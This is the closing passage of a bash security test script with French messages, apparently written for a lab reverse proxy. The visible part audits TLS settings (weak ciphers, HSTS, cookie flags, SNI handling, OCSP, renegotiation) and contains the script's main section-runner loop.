    case "$out" in
      *"no cipher match"*|*"Error with command"*) skip "suites $c : indisponibles dans ce client OpenSSL";;
      *"Cipher is (NONE)"*|*"handshake failure"*|*"no shared cipher"*|*"alert"*) ok "suites faibles $c refusées";;
      *"Cipher    : "*|*"Cipher is "*) ko "suite faible acceptée ($c) : $(echo "$out" | grep -m1 'Cipher is')";;
      *) ok "suites faibles $c refusées";;
    esac
  done
  out=$(tlsrun -tls1_3 -alpn h2,http/1.1); case "$out" in *"ALPN protocol: h2"*) ok "ALPN : h2 négocié";; *) info "ALPN : h2 non négocié ($(echo "$out" | grep -m1 ALPN))";; esac
  check "requête HTTP/2" "$(curl -sk --http2 -o /dev/null -w '%{http_version}' "$(us tls)/whoami")" 2
  out=$(tlsrun -tls1_3 -showcerts)
  echo "$out" | tr -d '\000' | grep -q "Compression: NONE" && ok "compression TLS désactivée" || info "compression TLS : $(echo "$out" | tr -d '\000' | grep -m1 -i compression)"
  cn=$(echo "$out" | openssl x509 -noout -text 2>/dev/null)
  sig=$(echo "$cn" | grep -m1 'Signature Algorithm' | awk '{print $3}'); bits=$(echo "$cn" | grep -m1 -E 'Public-Key|ASN1 OID' )
  case "$sig" in *md5*|*sha1*|*SHA1*|*MD5*) ko "signature faible du certificat ($sig)";; *) ok "signature du certificat : $sig";; esac
  info "clé publique : $bits"
  hdr=$(curl -sk -D- -o /dev/null "$(us tls)/whoami" | tr -d '\r')
  echo "$hdr" | grep -qi '^strict-transport-security: .*max-age=31536000' && ok "HSTS (max-age 1 an)" || ko "HSTS absent ou court"
  echo "$hdr" | grep -qi '^alt-svc' && info "Alt-Svc présent (HTTP/3 annoncé)" || info "Alt-Svc absent"
  jar=$(curl -sk -D- -o /dev/null "$(us tls)/whoami" | tr -d '\r' | grep -i '^set-cookie: LABSID')
  if [ -z "$jar" ]; then ko "cookie LABSID absent"; else
    case "$jar" in *[Ss]ecure*) ok "cookie sticky : Secure";; *) ko "cookie sticky sans Secure sur HTTPS";; esac
    case "$jar" in *[Hh]ttp[Oo]nly*) ok "cookie sticky : HttpOnly";; *) ko "cookie sticky sans HttpOnly";; esac
    case "$jar" in *[Ss]ame[Ss]ite*) ok "cookie sticky : SameSite";; *) ko "cookie sticky sans SameSite";; esac
  fi
  out=$(curl -sk -o /dev/null -w '%{http_code}' -H 'Host: lab-sec-plain.lab.test' "$(us tls)/whoami"); info "SNI lab-sec-tls avec Host d'une autre route : $out (certificat commun *.lab.test)"
  out=$(SNI=inconnu.invalid tlsrun -tls1_3 | grep -m1 'subject=' ); info "SNI inconnu : ${out:-aucun certificat présenté}"
  out=$(curl -s -o /dev/null -w '%{http_code} %{redirect_url}' -H 'Host: lab-sec-tls.lab.test' "http://$EDGE_HOST/whoami"); info "HTTP clair vers une route TLS : $out"
  out=$(tlsrun -tls1_3 -status | grep -m1 -i 'OCSP'); info "agrafage OCSP : ${out:-non annoncé (certificat auto-signé)}"
  echo "$(tlsrun -tls1_2 -reconnect | grep -c 'Reused')" | grep -qE '^[1-9]' && info "reprise de session TLS 1.2 : active" || info "reprise de session TLS 1.2 : non observée"
  tlsrun -tls1_2 | grep -q 'Secure Renegotiation IS supported' && ok "renégociation sécurisée (RFC 5746)" || info "renégociation sécurisée : non annoncée en TLS 1.2"
}

# ------------------------------------------------------------------ main
mode=${1:-all}; SECTIONS=${2:-}
case "$mode" in
  seed) seed; exit 0 ;;
  run|all) ;;
  *) echo "usage : security.sh [seed|run [sections]|all]"; exit 2 ;;
esac
[ "$mode" = all ] && seed
if [ -n "${LAB_ADMIN_TOKEN:-}${LAB_ADMIN_EMAIL:-}" ]; then . /lab/scripts/auth.sh 2>/dev/null; fi
preflight
for s in trust acl ratelimit inject protocol waf cache ws jwt errleak admin tls; do "t_$s"; guard; done
echo; echo "Bilan : $npass PASS, $fail FAIL, $nskip ignorés"
exit $fail
